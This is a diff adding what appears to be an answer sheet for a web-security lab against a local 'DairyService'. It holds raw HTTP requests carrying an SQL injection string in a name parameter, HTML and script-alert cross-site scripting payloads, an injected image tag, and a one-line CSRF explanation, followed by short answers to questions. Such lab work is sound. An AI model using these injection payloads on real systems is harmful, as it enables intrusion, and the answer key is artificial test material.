@@ -1,0 +1,51 @@
+N01
+POST http://localhost:8188/DairyService.svc/comment?name=' or1=1-- HTTP/1.1
+Host: localhost:8188
+Content-Type: application/json
+
+N02
+POST http://localhost:8188/DairyService.svc/comment?name= HTTP/1.1
+Host: localhost:8188
+Content-Type: application/json
+Content-Length: 19
+
+<input type="text">
+
+N03
+POST http://localhost:8188/DairyService.svc/comment?name= HTTP/1.1
+Host: localhost:8188
+Content-Type: application/json
+Content-Length: 229
+
+<img src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1600609715889&di=4829ea08d72b70afc9ff7fd9064b2ec4&imgtype=0&src=http%3A%2F%2Fwww.leaderwe.com%2Fwp-content%2Fuploads%2F2016%2F03%2Fntk-1842-5488.jpg" >
+
+N04
+POST http://localhost:8188/DairyService.svc/comment?name= HTTP/1.1
+Host: localhost:8188
+Content-Type: application/json
+content-length: 30
+
+<script>alert("yes");</script>
+
+N05
+As browser saves the session cookie and send it automatically, There is a posibiliy that, attacker creates a malicious link, 
+which directs the victim to execute sensitive operation on the attacked web application, e.g. change password.
+
+N06
+GET http://localhost:8189/Service.svc/buy?id=248309242 HTTP/1.1
+Host: localhost:8189
+
+C01
+SQLite
+
+C02
+3
+
+C03
+altha
+
+C04
+
+
+C05
+
